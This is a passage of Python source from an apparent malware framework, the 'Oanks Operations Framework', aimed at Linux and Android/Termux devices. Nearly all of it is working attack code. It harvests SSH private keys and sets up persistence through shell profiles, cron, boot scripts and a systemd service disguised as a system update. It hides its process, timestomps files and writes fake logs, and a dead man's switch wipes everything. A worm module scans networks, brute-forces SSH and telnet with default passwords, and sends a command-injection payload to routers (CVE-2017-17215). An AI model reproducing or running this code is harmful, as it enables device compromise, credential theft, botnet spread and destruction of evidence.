                for filename in os.listdir(ssh_dir):
                    filepath = os.path.join(ssh_dir, filename)
                    if os.path.isfile(filepath) and not filename.endswith(".pub"):
                        try:
                            with open(filepath, "r") as f:
                                content = f.read()
                            if "BEGIN OPENSSH PRIVATE KEY" in content or "BEGIN RSA PRIVATE KEY" in content:
                                keys.append({
                                    "path": filepath,
                                    "type": "ssh_private",
                                    "size": os.path.getsize(filepath),
                                    "fingerprint": hashlib.sha3_256(content.encode()).hexdigest()[:16]
                                })
                        except:
                            pass
        return keys

    def get_termux_info(self):
        info = {}
        if not IS_TERMUX:
            return info
        try:
            info["termux_version"] = os.environ.get("TERMUX_VERSION", "unknown")
            info["termux_api_version"] = os.environ.get("TERMUX_API_VERSION", "unknown")
            info["prefix"] = os.environ.get("PREFIX", "unknown")
            info["home"] = os.environ.get("HOME", "unknown")
            # Check for Termux:API
            try:
                result = subprocess.run(["termux-api-version"], capture_output=True, text=True, timeout=2)
                info["api_available"] = result.returncode == 0
            except:
                info["api_available"] = False
            # Check for Magisk
            try:
                magisk = subprocess.run(["su", "-c", "magisk", "-v"], capture_output=True, text=True, timeout=2)
                info["magisk_version"] = magisk.stdout.strip() if magisk.returncode == 0 else None
            except:
                info["magisk_version"] = None
            # Check for busybox
            try:
                busybox = subprocess.run(["busybox"], capture_output=True, text=True, timeout=2)
                info["busybox_available"] = busybox.returncode == 0
            except:
                info["busybox_available"] = False
        except:
            pass
        return info

    def full_recon(self):
        with self._lock:
            recon = {
                "oanks_id": generate_oanks_id(),
                "timestamp": datetime.datetime.utcnow().isoformat(),
                "hostname": self.get_hostname(),
                "fqdn": self.get_fqdn(),
                "platform": self.get_platform_info(),
                "cpu": self.get_cpu_info(),
                "memory": self.get_memory_info(),
                "disk": self.get_disk_info(),
                "network": self.get_network_info(),
                "processes": self.get_process_list(),
                "open_files": self.get_open_files(),
                "ssh_keys": self.get_ssh_keys(),
                "sandbox_indicators": self.detect_sandbox(),
                "debugger_indicators": self.detect_debugger(),
                "vm_indicators": self.detect_vm(),
                "termux": self.get_termux_info() if IS_TERMUX else None,
                "is_compromised": False
            }
            # Determine if environment is compromised
            total_indicators = (len(recon["sandbox_indicators"]) + 
                              len(recon["debugger_indicators"]) + 
                              len(recon["vm_indicators"]))
            if total_indicators >= 3:
                recon["is_compromised"] = True
            self._fingerprint = recon
            return recon

    def get_fingerprint(self):
        if self._fingerprint is None:
            return self.full_recon()
        return self._fingerprint


# ============================================================================
# SECTION 9: PERSISTENCE MANAGER — Termux/Android optimized.
# ============================================================================

class PersistenceManager:
    """Military-grade persistence for Linux/Termux/Android environments.
    Multiple fallback mechanisms ensure survival across reboots."""
    __slots__ = ("_crypto", "_installed", "_lock")

    def __init__(self, crypto_engine=None):
        self._crypto = crypto_engine
        self._installed = False
        self._lock = threading.RLock()

    def _get_script_path(self):
        return os.path.join(BASE_DIR, "oanks_daemon.py")

    def install_shell_profile(self):
        with self._lock:
            injected = []
            profiles = [
                os.path.expanduser("~/.bashrc"),
                os.path.expanduser("~/.zshrc"),
                os.path.expanduser("~/.profile"),
                os.path.expanduser("~/.bash_profile")
            ]
            if IS_TERMUX:
                profiles.append("/data/data/com.termux/files/home/.bashrc")
                profiles.append("/data/data/com.termux/files/home/.profile")
            marker = "# Oanks Operations Framework — Persistence"
            daemon_cmd = f"python3 {self._get_script_path()} &>/dev/null &"
            for profile in profiles:
                if os.path.exists(profile):
                    try:
                        with open(profile, "r") as f:
                            content = f.read()
                        if marker not in content:
                            with open(profile, "a") as f:
                                f.write(f"\n{marker}\n")
                                f.write(f"(sleep 10 && {daemon_cmd}) &\n")
                            injected.append(profile)
                    except:
                        pass
            return injected

    def install_cron_job(self):
        with self._lock:
            try:
                cron_entry = f"*/5 * * * * python3 {self._get_script_path()} >> /dev/null 2>&1\n"
                # Try crontab
                result = subprocess.run(["crontab", "-l"], capture_output=True, text=True, timeout=5)
                current_crontab = result.stdout if result.returncode == 0 else ""
                if self._get_script_path() not in current_crontab:
                    new_crontab = current_crontab + cron_entry
                    proc = subprocess.Popen(["crontab", "-"], stdin=subprocess.PIPE, text=True)
                    proc.communicate(input=new_crontab, timeout=5)
                    return proc.returncode == 0
                return True
            except:
                pass
            # Try anacron
            try:
                anacron_dir = os.path.expanduser("~/.anacron")
                os.makedirs(anacron_dir, exist_ok=True)
                anacron_tab = os.path.join(anacron_dir, "oanks")
                with open(anacron_tab, "w") as f:
                    f.write(f"1\t5\toanks\tpython3 {self._get_script_path()}\n")
                return True
            except:
                pass
            return False

    def install_termux_boot(self):
        with self._lock:
            if not IS_TERMUX:
                return False
            try:
                boot_dir = "/data/data/com.termux/files/home/.termux/boot"
                os.makedirs(boot_dir, exist_ok=True)
                boot_script = os.path.join(boot_dir, "oanks")
                with open(boot_script, "w") as f:
                    f.write("#!/data/data/com.termux/files/usr/bin/sh\n")
                    f.write(f"python3 {self._get_script_path()} &\n")
                os.chmod(boot_script, 0o700)
                return True
            except:
                pass
            return False

    def install_systemd_service(self):
        with self._lock:
            if IS_TERMUX or not IS_LINUX:
                return False
            try:
                service_content = f"""[Unit]
Description=System Update Service
After=network.target

[Service]
Type=simple
ExecStart=/usr/bin/python3 {self._get_script_path()}
Restart=always
RestartSec=10
User={getpass.getuser()}

[Install]
WantedBy=multi-user.target
"""
                service_path = "/etc/systemd/system/oanks-update.service"
                if IS_ROOTED:
                    with open(service_path, "w") as f:
                        f.write(service_content)
                    subprocess.run(["systemctl", "daemon-reload"], capture_output=True, timeout=10)
                    subprocess.run(["systemctl", "enable", "oanks-update"], capture_output=True, timeout=10)
                    subprocess.run(["systemctl", "start", "oanks-update"], capture_output=True, timeout=10)
                    return True
            except:
                pass
            return False

    def install_init_d(self):
        with self._lock:
            if IS_TERMUX or not IS_LINUX:
                return False
            try:
                init_script = f"""#!/bin/sh
### BEGIN INIT INFO
# Provides:          oanks-update
# Required-Start:    $remote_fs $syslog
# Required-Stop:     $remote_fs $syslog
# Default-Start:     2 3 4 5
# Default-Stop:      0 1 6
### END INIT INFO

case "$1" in
  start)
    python3 {self._get_script_path()} &
    ;;
  stop)
    pkill -f oanks_daemon.py
    ;;
  *)
    exit 1
    ;;
esac
exit 0
"""
                init_path = "/etc/init.d/oanks-update"
                if IS_ROOTED:
                    with open(init_path, "w") as f:
                        f.write(init_script)
                    os.chmod(init_path, 0o755)
                    subprocess.run(["update-rc.d", "oanks-update", "defaults"], capture_output=True, timeout=10)
                    return True
            except:
                pass
            return False

    def hide_process_name(self, name=None):
        with self._lock:
            if name is None:
                name = random.choice(LINUX_HIDE_NAMES)
            try:
                # Try to set process title using ctypes
                libc = ctypes.CDLL("libc.so.6")
                # Set argv[0]
                argv0 = (ctypes.c_char * 256)(*name.encode())
                libc.prctl(15, ctypes.byref(argv0), 0, 0, 0)  # PR_SET_NAME
                return True
            except:
                pass
            try:
                # Alternative: modify /proc/self/comm
                with open("/proc/self/comm", "w") as f:
                    f.write(name.strip("[]"))
                return True
            except:
                pass
            return False

    def install_all(self):
        with self._lock:
            results = {
                "shell_profile": self.install_shell_profile(),
                "cron_job": self.install_cron_job(),
                "termux_boot": self.install_termux_boot() if IS_TERMUX else None,
                "systemd": self.install_systemd_service(),
                "init_d": self.install_init_d(),
                "process_hidden": self.hide_process_name()
            }
            self._installed = any(bool(v) for v in results.values() if v is not None)
            # Write persistence marker
            try:
                with open(PERSISTENCE_MARKER, "w") as f:
                    f.write(json.dumps(results))
                os.chmod(PERSISTENCE_MARKER, 0o600)
            except:
                pass
            return results

    def verify_persistence(self):
        with self._lock:
            if not os.path.exists(PERSISTENCE_MARKER):
                return False
            try:
                with open(PERSISTENCE_MARKER, "r") as f:
                    data = json.load(f)
                return any(bool(v) for v in data.values() if v is not None)
            except:
                return False

    def remove_persistence(self):
        with self._lock:
            removed = []
            profiles = [
                os.path.expanduser("~/.bashrc"),
                os.path.expanduser("~/.zshrc"),
                os.path.expanduser("~/.profile")
            ]
            marker = "# Oanks Operations Framework — Persistence"
            for profile in profiles:
                if os.path.exists(profile):
                    try:
                        with open(profile, "r") as f:
                            lines = f.readlines()
                        with open(profile, "w") as f:
                            skip = False
                            for line in lines:
                                if marker in line:
                                    skip = True
                                    continue
                                if skip and line.strip().startswith("("):
                                    skip = False
                                    continue
                                if skip:
                                    skip = False
                                f.write(line)
                        removed.append(profile)
                    except:
                        pass
            # Remove crontab entries
            try:
                result = subprocess.run(["crontab", "-l"], capture_output=True, text=True, timeout=5)
                if result.returncode == 0:
                    lines = [l for l in result.stdout.split("\n") if "oanks_daemon.py" not in l]
                    new_crontab = "\n".join(lines)
                    proc = subprocess.Popen(["crontab", "-"], stdin=subprocess.PIPE, text=True)
                    proc.communicate(input=new_crontab, timeout=5)
            except:
                pass
            # Remove systemd
            if IS_ROOTED and not IS_TERMUX:
                try:
                    subprocess.run(["systemctl", "stop", "oanks-update"], capture_output=True, timeout=10)
                    subprocess.run(["systemctl", "disable", "oanks-update"], capture_output=True, timeout=10)
                    if os.path.exists("/etc/systemd/system/oanks-update.service"):
                        os.remove("/etc/systemd/system/oanks-update.service")
                except:
                    pass
            # Remove marker
            if os.path.exists(PERSISTENCE_MARKER):
                secure_overwrite_file(PERSISTENCE_MARKER)
            self._installed = False
            return removed

# ============================================================================
# SECTION 10: LOG MANAGER — Encrypted, auto-rotating, anti-forensic.
# ============================================================================

class LogManager:
    """Military-grade encrypted logging with rotation and anti-forensic features."""
    __slots__ = ("_crypto", "_log_path", "_level", "_lock", "_current_size")

    LEVELS = {"DEBUG": 10, "INFO": 20, "WARNING": 30, "ERROR": 40, "CRITICAL": 50}

    def __init__(self, crypto_engine, log_path=LOG_PATH, level="INFO"):
        self._crypto = crypto_engine
        self._log_path = log_path
        self._level = self.LEVELS.get(level, 20)
        self._lock = threading.RLock()
        self._current_size = 0
        if os.path.exists(log_path):
            self._current_size = os.path.getsize(log_path)
        os.makedirs(os.path.dirname(log_path), exist_ok=True)

    def _rotate_if_needed(self):
        if self._current_size > LOG_MAX_BYTES:
            self._rotate()
        # Also check age
        if os.path.exists(self._log_path):
            mtime = os.path.getmtime(self._log_path)
            if time.time() - mtime > LOG_MAX_AGE_SECONDS:
                self._rotate()

    def _rotate(self):
        ts = datetime.datetime.utcnow().strftime("%Y%m%d_%H%M%S")
        rotated = f"{self._log_path}.{ts}"
        if os.path.exists(self._log_path):
            shutil.move(self._log_path, rotated)
            # Encrypt rotated log
            try:
                self._crypto.encrypt_file(rotated, rotated + ".oanks")
                secure_overwrite_file(rotated)
            except:
                pass
        self._current_size = 0
        # Clean old rotated logs
        log_dir = os.path.dirname(self._log_path)
        for f in os.listdir(log_dir):
            if f.startswith(os.path.basename(self._log_path) + ".") and f.endswith(".oanks"):
                fpath = os.path.join(log_dir, f)
                if time.time() - os.path.getmtime(fpath) > LOG_MAX_AGE_SECONDS * 7:
                    secure_overwrite_file(fpath)

    def log(self, level, component, message, encrypt=True):
        with self._lock:
            if self.LEVELS.get(level, 20) < self._level:
                return
            self._rotate_if_needed()
            timestamp = datetime.datetime.utcnow().isoformat()
            entry = {
                "timestamp": timestamp,
                "level": level,
                "component": component,
                "message": message,
                "oanks_id": generate_oanks_id(),
                "oanks_tag": OANKS_SIGNATURE
            }
            entry_json = json.dumps(entry).encode("utf-8")
            if encrypt and self._crypto:
                entry_json = self._crypto.encrypt_triple_layer(entry_json)
                entry_b64 = base64.b64encode(entry_json).decode() + "\n"
            else:
                entry_b64 = entry_json.decode() + "\n"
            with open(self._log_path, "a") as f:
                f.write(entry_b64)
            self._current_size += len(entry_b64)

    def debug(self, component, message):
        self.log("DEBUG", component, message)

    def info(self, component, message):
        self.log("INFO", component, message)

    def warning(self, component, message):
        self.log("WARNING", component, message)

    def error(self, component, message):
        self.log("ERROR", component, message)

    def critical(self, component, message):
        self.log("CRITICAL", component, message)

    def generate_fake_logs(self, count=100):
        with self._lock:
            fake_components = ["kernel", "systemd", "sshd", "cron", "network", "dbus"]
            fake_levels = ["INFO", "DEBUG", "WARNING"]
            fake_messages = [
                "Service started successfully",
                "Connection established",
                "Routine maintenance completed",
                "Package updated",
                "User login from 192.168.1.1",
                "Disk usage at 45%",
                "Memory allocation normal",
                "Network interface eth0 up"
            ]
            for _ in range(count):
                comp = random.choice(fake_components)
                lvl = random.choice(fake_levels)
                msg = random.choice(fake_messages)
                ts = (datetime.datetime.utcnow() - datetime.timedelta(
                    seconds=random.randint(0, 86400*7))).isoformat()
                entry = f"[{ts}] [{lvl}] {comp}: {msg}\n"
                with open(self._log_path, "a") as f:
                    f.write(entry)

    def read_logs(self, decrypt=True, limit=1000):
        with self._lock:
            if not os.path.exists(self._log_path):
                return []
            entries = []
            with open(self._log_path, "r") as f:
                for line in f:
                    line = line.strip()
                    if not line:
                        continue
                    try:
                        if decrypt:
                            data = base64.b64decode(line)
                            plaintext = self._crypto.decrypt_triple_layer(data)
                            entries.append(json.loads(plaintext.decode("utf-8")))
                        else:
                            entries.append(json.loads(line))
                    except:
                        entries.append({"raw": line})
                    if len(entries) >= limit:
                        break
            return entries

    def secure_wipe(self):
        with self._lock:
            log_dir = os.path.dirname(self._log_path)
            for f in os.listdir(log_dir):
                fpath = os.path.join(log_dir, f)
                if os.path.isfile(fpath):
                    secure_overwrite_file(fpath)


# ============================================================================
# SECTION 11: DEAD MAN'S SWITCH — Heartbeat. Auto-wipe. No survivors.
# ============================================================================

class DeadMansSwitch:
    """Military-grade dead man's switch with cryptographic heartbeat verification.
    3 missed heartbeats triggers complete system annihilation."""
    __slots__ = ("_crypto", "_db", "_interval", "_missed_limit", "_wipe_delay",
                 "_monitoring", "_monitor_thread", "_lock", "_last_heartbeat")

    def __init__(self, crypto_engine, db_manager=None, interval=HEARTBEAT_INTERVAL,
                 missed_limit=HEARTBEAT_MISSED_LIMIT, wipe_delay=WIPE_DELAY_SECONDS):
        self._crypto = crypto_engine
        self._db = db_manager
        self._interval = interval
        self._missed_limit = missed_limit
        self._wipe_delay = wipe_delay
        self._monitoring = False
        self._monitor_thread = None
        self._lock = threading.RLock()
        self._last_heartbeat = time.time()

    def send_heartbeat(self, data=None):
        with self._lock:
            timestamp = str(time.time()).encode("utf-8")
            if data:
                timestamp += b":" + (data if isinstance(data, bytes) else data.encode())
            signature = self._crypto.hmac_sign(timestamp)
            heartbeat = {
                "timestamp": timestamp.decode("utf-8", errors="replace"),
                "signature": base64.b64encode(signature).decode(),
                "oanks_id": generate_oanks_id()
            }
            # Write to file
            hb_data = json.dumps(heartbeat).encode("utf-8")
            encrypted_hb = self._crypto.encrypt_triple_layer(hb_data)
            with open(HEARTBEAT_PATH, "wb") as f:
                f.write(encrypted_hb)
            os.chmod(HEARTBEAT_PATH, 0o600)
            # Update DB if available
            if self._db:
                try:
                    self._db.execute(
                        "UPDATE dead_mans_switch SET last_heartbeat = CURRENT_TIMESTAMP, missed_count = 0, is_triggered = 0 WHERE id = 1"
                    )
                except:
                    pass
            self._last_heartbeat = time.time()
            return heartbeat

    def verify_heartbeat(self):
        with self._lock:
            if not os.path.exists(HEARTBEAT_PATH):
                return False, "NO_HEARTBEAT_FILE"
            try:
                with open(HEARTBEAT_PATH, "rb") as f:
                    encrypted_hb = f.read()
                hb_data = self._crypto.decrypt_triple_layer(encrypted_hb)
                heartbeat = json.loads(hb_data.decode("utf-8"))
                timestamp = heartbeat["timestamp"].split(":")[0].encode()
                signature = base64.b64decode(heartbeat["signature"])
                if not self._crypto.hmac_verify(timestamp, signature):
                    return False, "SIGNATURE_INVALID"
                hb_time = float(timestamp.decode())
                elapsed = time.time() - hb_time
                if elapsed > self._interval * self._missed_limit:
                    return False, "HEARTBEAT_EXPIRED"
                return True, "VALID"
            except Exception as e:
                return False, f"VERIFY_ERROR:{e}"

    def check_missed_heartbeats(self):
        with self._lock:
            valid, reason = self.verify_heartbeat()
            if not valid:
                missed = int((time.time() - self._last_heartbeat) / self._interval)
                if self._db:
                    try:
                        self._db.execute(
                            "UPDATE dead_mans_switch SET missed_count = ?, is_triggered = 1, triggered_at = CURRENT_TIMESTAMP WHERE id = 1",
                            (missed,)
                        )
                    except:
                        pass
                if missed >= self._missed_limit:
                    return True, missed
            return False, 0

    def trigger_wipe(self):
        with self._lock:
            self._monitoring = False
            # Log the trigger
            if self._db:
                try:
                    self._db.execute(
                        "UPDATE dead_mans_switch SET wipe_initiated = 1 WHERE id = 1"
                    )
                except:
                    pass
            # Delay before wipe
            time.sleep(self._wipe_delay)
            self._execute_wipe()

    def _execute_wipe(self):
        with self._lock:
            wipe_results = {
                "files_wiped": 0,
                "database_wiped": False,
                "logs_wiped": False,
                "keys_wiped": False,
                "timestamp": datetime.datetime.utcnow().isoformat()
            }
            # Wipe all framework files
            for root, dirs, files in os.walk(BASE_DIR):
                for f in files:
                    fpath = os.path.join(root, f)
                    try:
                        secure_overwrite_file(fpath)
                        wipe_results["files_wiped"] += 1
                    except:
                        pass
            # Wipe database
            if os.path.exists(DB_PATH):
                try:
                    secure_overwrite_file(DB_PATH)
                    wipe_results["database_wiped"] = True
                except:
                    pass
            # Wipe keys
            if os.path.exists(KEY_PATH):
                try:
                    secure_overwrite_file(KEY_PATH)
                    wipe_results["keys_wiped"] = True
                except:
                    pass
            # Wipe crypto keys in memory
            if self._crypto:
                self._crypto.secure_wipe_keys()
            # Remove directories
            for d in [DATA_DIR, LOG_DIR, EXPORT_DIR, BACKUP_DIR]:
                if os.path.exists(d):
                    try:
                        shutil.rmtree(d)
                    except:
                        pass
            # Final self-destruct
            try:
                os.rmdir(BASE_DIR)
            except:
                pass
            return wipe_results

    def _monitor_loop(self):
        while self._monitoring:
            try:
                triggered, missed = self.check_missed_heartbeats()
                if triggered:
                    self.trigger_wipe()
                    break
                time.sleep(60)
            except:
                time.sleep(60)

    def start_monitoring(self):
        with self._lock:
            if self._monitoring:
                return False
            self._monitoring = True
            self._monitor_thread = threading.Thread(target=self._monitor_loop, daemon=True)
            self._monitor_thread.start()
            return True

    def stop_monitoring(self):
        with self._lock:
            self._monitoring = False
            if self._monitor_thread:
                self._monitor_thread.join(timeout=5)
                self._monitor_thread = None
            return True

    def is_monitoring(self):
        with self._lock:
            return self._monitoring


# ============================================================================
# SECTION 12: ANTI-FORENSIC — Memory obfuscation. Timestomping. Fake logs.
# ============================================================================

class AntiForensic:
    """Military-grade anti-forensic operations for evidence destruction and misdirection."""
    __slots__ = ("_crypto", "_lock")

    def __init__(self, crypto_engine=None):
        self._crypto = crypto_engine
        self._lock = threading.RLock()

    def obfuscate_memory(self, data):
        with self._lock:
            if isinstance(data, str):
                data = data.encode("utf-8")
            if not isinstance(data, (bytes, bytearray)):
                data = str(data).encode("utf-8")
            key = secrets.token_bytes(32)
            obfuscated = bytes([data[i] ^ key[i % 32] for i in range(len(data))])
            # Wipe original
            if isinstance(data, bytearray):
                for i in range(len(data)):
                    data[i] = 0
            return obfuscated, key

    def deobfuscate_memory(self, obfuscated, key):
        with self._lock:
            return bytes([obfuscated[i] ^ key[i % 32] for i in range(len(obfuscated))])

    def timestomp_file(self, filepath, reference_file=None):
        with self._lock:
            if not os.path.exists(filepath):
                return False
            try:
                if reference_file and os.path.exists(reference_file):
                    stat = os.stat(reference_file)
                    atime = stat.st_atime
                    mtime = stat.st_mtime
                else:
                    # Set to system file times
                    atime = time.time() - random.randint(86400*30, 86400*365)
                    mtime = atime - random.randint(0, 86400*7)
                os.utime(filepath, (atime, mtime))
                return True
            except Exception as e:
                raise AntiForensicError(f"Timestomp failed: {e}", code="TIMESTOMP_FAIL")

    def corrupt_timestamps(self, directory):
        with self._lock:
            corrupted = 0
            for root, dirs, files in os.walk(directory):
                for f in files:
                    fpath = os.path.join(root, f)
                    try:
                        self.timestomp_file(fpath)
                        corrupted += 1
                    except:
                        pass
            return corrupted

    def inject_false_metadata(self, filepath, fake_creator="system", fake_date=None):
        with self._lock:
            if fake_date is None:
                fake_date = datetime.datetime.utcnow() - datetime.timedelta(days=random.randint(30, 365))
            try:
                # Modify extended attributes if supported
                fake_meta = json.dumps({
                    "creator": fake_creator,
                    "created": fake_date.isoformat(),
                    "modified": fake_date.isoformat(),
                    "version": "1.0"
                })
                os.setxattr(filepath, b"user.oanks.fake", fake_meta.encode())
            except:
                pass
            return True

    def hide_from_ps(self):
        with self._lock:
            try:
                libc = ctypes.CDLL("libc.so.6")
                name = random.choice(LINUX_HIDE_NAMES)
                argv0 = (ctypes.c_char * 256)(*name.encode())
                libc.prctl(15, ctypes.byref(argv0), 0, 0, 0)
                return True
            except:
                pass
            return False

    def evade_signature(self, filepath):
        with self._lock:
            if not os.path.exists(filepath):
                return False
            try:
                with open(filepath, "rb") as f:
                    data = bytearray(f.read())
                # Insert NOP-like padding at random locations
                for _ in range(random.randint(5, 20)):
                    pos = random.randint(0, len(data))
                    data.insert(pos, random.randint(0, 255))
                with open(filepath, "wb") as f:
                    f.write(bytes(data))
                return True
            except:
                pass
            return False

    def create_decoy_files(self, directory, count=20):
        with self._lock:
            decoy_names = [
                "tax_return_2023.pdf", "bank_statement.pdf", "passwords.txt",
                "wallet_backup.dat", "private_key.pem", "secrets.docx",
                "meeting_notes.txt", "project_plan.pdf", "resume.docx",
                "family_photos.zip", "invoice_001.pdf", "contract.pdf"
            ]
            created = []
            for i in range(min(count, len(decoy_names))):
                fpath = os.path.join(directory, decoy_names[i])
                try:
                    with open(fpath, "w") as f:
                        f.write(secrets.token_hex(random.randint(100, 1000)))
                    self.timestomp_file(fpath)
                    created.append(fpath)
                except:
                    pass
            return created

    def full_sanitization(self):
        with self._lock:
            results = {
                "timestomped": 0,
                "decoys_created": 0,
                "memory_obfuscated": False,
                "process_hidden": False
            }
            # Timestomp all framework files
            for root, dirs, files in os.walk(BASE_DIR):
                for f in files:
                    try:
                        self.timestomp_file(os.path.join(root, f))
                        results["timestomped"] += 1
                    except:
                        pass
            # Create decoys
            decoy_dir = os.path.join(os.path.expanduser("~"), "Documents")
            if os.path.exists(decoy_dir):
                results["decoys_created"] = len(self.create_decoy_files(decoy_dir))
            # Hide process
            results["process_hidden"] = self.hide_from_ps()
            return results

# ============================================================================
# SECTION 13: WORM BASE — Network propagation foundation.
# ============================================================================

class WormBase:
    """Foundation for network worm propagation.
    Scanning, exploitation prep, and botnet node management."""
    __slots__ = ("_crypto", "_db", "_lock", "_scan_results")

    COMMON_PORTS = [22, 23, 80, 443, 7547, 8080, 8443, 21, 25, 53, 110, 143, 993, 995, 3306, 3389, 5900, 8081, 8888]
    ROUTER_PATHS = ["/cgi-bin/", "/login.cgi", "/admin", "/setup.cgi", "/wizard.cgi", "/config.cgi"]
    DEFAULT_CREDS = [
        ("admin", "admin"), ("admin", "password"), ("admin", "1234"),
        ("root", "root"), ("root", "admin"), ("user", "user"),
        ("admin", ""), ("root", ""), ("support", "support"),
        ("admin", "123456"), ("admin", "password123"), ("root", "toor")
    ]

    def __init__(self, crypto_engine=None, db_manager=None):
        self._crypto = crypto_engine
        self._db = db_manager
        self._lock = threading.RLock()
        self._scan_results = {}

    def ping_sweep(self, subnet):
        with self._lock:
            alive_hosts = []
            base_ip = ".".join(subnet.split(".")[:3])
            for i in range(1, 255):
                ip = f"{base_ip}.{i}"
                try:
                    result = subprocess.run(
                        ["ping", "-c", "1", "-W", "1", ip],
                        capture_output=True, timeout=3
                    )
                    if result.returncode == 0:
                        alive_hosts.append(ip)
                except:
                    pass
            self._scan_results["ping_sweep"] = alive_hosts
            return alive_hosts

    def port_scan(self, target, ports=None, timeout=2):
        with self._lock:
            if ports is None:
                ports = self.COMMON_PORTS
            open_ports = []
            for port in ports:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(timeout)
                    result = sock.connect_ex((target, port))
                    if result == 0:
                        try:
                            banner = sock.recv(1024).decode("utf-8", errors="ignore").strip()
                        except:
                            banner = ""
                        open_ports.append({"port": port, "banner": banner})
                    sock.close()
                except:
                    pass
            self._scan_results[f"port_scan_{target}"] = open_ports
            return open_ports

    def identify_router(self, target):
        with self._lock:
            router_indicators = []
            for path in self.ROUTER_PATHS:
                try:
                    req = urllib.request.Request(f"http://{target}{path}", timeout=5)
                    response = urllib.request.urlopen(req, timeout=5)
                    content = response.read().decode("utf-8", errors="ignore")
                    for keyword in ["router", "gateway", "firmware", "admin", "login", "wireless"]:
                        if keyword.lower() in content.lower():
                            router_indicators.append({
                                "path": path,
                                "keyword": keyword,
                                "status": response.getcode()
                            })
                            break
                except:
                    pass
            return router_indicators

    def check_vulnerability(self, target, port, cve_id):
        with self._lock:
            vuln_checks = {
                "CVE-2018-10562": self._check_cve_2018_10562,
                "CVE-2020-9054": self._check_cve_2020_9054,
                "CVE-2017-17215": self._check_cve_2017_17215
            }
            checker = vuln_checks.get(cve_id)
            if checker:
                return checker(target, port)
            return {"cve": cve_id, "vulnerable": False, "reason": "No checker available"}

    def _check_cve_2018_10562(self, target, port):
        try:
            payload = b'<?xml version="1.0" ?><s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><s:Body><u:AddPortMapping xmlns:u="urn:schemas-upnp-org:service:WANIPConnection:1"><NewRemoteHost></NewRemoteHost><NewExternalPort>8080</NewExternalPort><NewProtocol>TCP</NewProtocol><NewInternalPort>8080</NewInternalPort><NewInternalClient>127.0.0.1</NewInternalClient><NewEnabled>1</NewEnabled><NewPortMappingDescription>test</NewPortMappingDescription><NewLeaseDuration>0</NewLeaseDuration></u:AddPortMapping></s:Body></s:Envelope>'
            req = urllib.request.Request(
                f"http://{target}:{port}/UD/act?1",
                data=payload,
                headers={"Content-Type": "text/xml", "SOAPAction": "urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping"}
            )
            response = urllib.request.urlopen(req, timeout=10)
            return {"cve": "CVE-2018-10562", "vulnerable": response.getcode() == 200, "response_code": response.getcode()}
        except Exception as e:
            return {"cve": "CVE-2018-10562", "vulnerable": False, "error": str(e)}

    def _check_cve_2020_9054(self, target, port):
        try:
            req = urllib.request.Request(f"http://{target}:{port}/cgi-bin/login.cgi", timeout=5)
            response = urllib.request.urlopen(req, timeout=5)
            content = response.read().decode("utf-8", errors="ignore")
            return {"cve": "CVE-2020-9054", "vulnerable": "Zyxel" in content or "zyxel" in content.lower(), "fingerprint": content[:200]}
        except Exception as e:
            return {"cve": "CVE-2020-9054", "vulnerable": False, "error": str(e)}

    def _check_cve_2017_17215(self, target, port):
        try:
            payload = b'<?xml version="1.0" ?><s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><s:Body><u:Upgrade xmlns:u="urn:schemas-upnp-org:service:WANIPConnection:1"><NewStatusURL>$(/bin/busybox wget -g 1.1.1.1 -l /tmp/test -r /test)</NewStatusURL><NewDownloadURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>'
            req = urllib.request.Request(
                f"http://{target}:{port}/ctrlt/DeviceUpgrade_1",
                data=payload,
                headers={"Content-Type": "text/xml", "Authorization": "Digest username=dslf-config, realm=HuaweiHomeGateway, nonce=88645cefb1f9ede0e336e3569d75d300, uri=/ctrlt/DeviceUpgrade_1, response=3612f843a42db38f48f59d2a3597e79c, algorithm=MD5"}
            )
            response = urllib.request.urlopen(req, timeout=10)
            return {"cve": "CVE-2017-17215", "vulnerable": response.getcode() == 200, "response_code": response.getcode()}
        except Exception as e:
            return {"cve": "CVE-2017-17215", "vulnerable": False, "error": str(e)}

    def brute_force_ssh(self, target, username_list=None, password_list=None, max_threads=10):
        with self._lock:
            if username_list is None:
                username_list = [c[0] for c in self.DEFAULT_CREDS]
            if password_list is None:
                password_list = [c[1] for c in self.DEFAULT_CREDS]
            results = []
            def try_login(user, pwd):
                try:
                    import paramiko
                    client = paramiko.SSHClient()
                    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    client.connect(target, username=user, password=pwd, timeout=5, banner_timeout=5)
                    client.close()
                    results.append({"username": user, "password": pwd, "success": True})
                except:
                    pass
            threads = []
            for user in username_list:
                for pwd in password_list:
                    t = threading.Thread(target=try_login, args=(user, pwd))
                    t.start()
                    threads.append(t)
                    if len(threads) >= max_threads:
                        for t in threads:
                            t.join(timeout=10)
                        threads = []
            for t in threads:
                t.join(timeout=10)
            return results

    def brute_force_telnet(self, target, username_list=None, password_list=None):
        with self._lock:
            if not TELNETLIB_AVAILABLE:
                return []
            if username_list is None:
                username_list = [c[0] for c in self.DEFAULT_CREDS]
            if password_list is None:
                password_list = [c[1] for c in self.DEFAULT_CREDS]
            results = []
            for user in username_list:
                for pwd in password_list:
                    try:
                        tn = telnetlib.Telnet(target, timeout=5)
                        tn.read_until(b"login: ", timeout=5)
                        tn.write(user.encode() + b"\n")
                        tn.read_until(b"Password: ", timeout=5)
                        tn.write(pwd.encode() + b"\n")
                        response = tn.read_until(b"$", timeout=5)
                        if b"$" in response or b"#" in response:
                            results.append({"username": user, "password": pwd, "success": True})
                        tn.close()
                    except:
                        pass
            return results

    def capture_handshake(self, interface="wlan0", duration=30):
        with self._lock:
            try:
                output_file = os.path.join(DATA_DIR, f"handshake_{secrets.token_hex(4)}.pcap")
                proc = subprocess.Popen(
                    ["tcpdump", "-i", interface, "-w", output_file, "-c", "10000"],
                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
                )
                time.sleep(duration)
                proc.terminate()
                proc.wait(timeout=5)
                return {"file": output_file, "size": os.path.getsize(output_file) if os.path.exists(output_file) else 0}
            except:
                pass
            return {"file": None, "size": 0}

    def store_infection(self, ip, port=None, device_type=None, os_info=None, credentials=None):
        with self._lock:
            if self._db:
                try:
